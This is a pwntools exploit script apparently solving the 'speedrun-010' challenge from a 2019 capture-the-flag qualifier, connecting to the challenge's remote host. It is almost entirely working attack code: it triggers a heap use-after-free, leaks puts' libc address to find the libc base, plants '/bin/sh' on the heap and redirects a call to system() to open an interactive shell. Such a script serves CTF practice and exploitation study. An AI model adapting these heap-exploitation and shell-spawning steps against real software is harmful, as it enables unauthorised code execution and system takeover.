from pwn import *

context.log_level = 'debug'
r = remote('speedrun-010.quals2019.oooverflow.io', 31337)

rr = lambda x : r.recvuntil(str(x))
ss = lambda x : r.sendline(str(x))
s0 = lambda x : r.send(str(x))
go = lambda x : (rr('5\n'), s0(x))

libc = ELF('./libc.so.6')
libc_puts_offset = libc.symbols['puts']
libc_system_offset = libc.symbols['system']
libc_one_gadget_offset = 0x4f322

# exchange chunk type(name<->msg) so that cause uaf
# last->name and last->msg will refer same heap address
go('1')
rr('\n')
s0('a'*23)

go('2')
rr('\n')
s0('b'*24)

go('3')
rr('\n')

go('2')
rr('\n')
s0('A'*0x10)

go('4')
rr('\n')

go('4')
rr('\n')

go('2')
rr('\n')
s0('B'*0x10)

# leak libc base address by put's libc address
# one_gadget doesn't work in this problem so I use system with /bin/sh
libc_puts = u64((rr('\n')[:-1]).ljust(8, '\x00'))
libc_base = libc_puts - libc_puts_offset
libc_system = libc_base + libc_system_offset
libc_one_gadget = libc_base + libc_one_gadget_offset 

# write "/bin/sh" to heap which will be in rdi when call system
go('1')
rr('\n')
s0('/bin/sh\x00')

# exchange chunk type 
go('3')
rr('\n')

# trigger system
go('2')
rr('\n')
s0('\x00'*0x10 + p64(libc_system))

r.interactive()
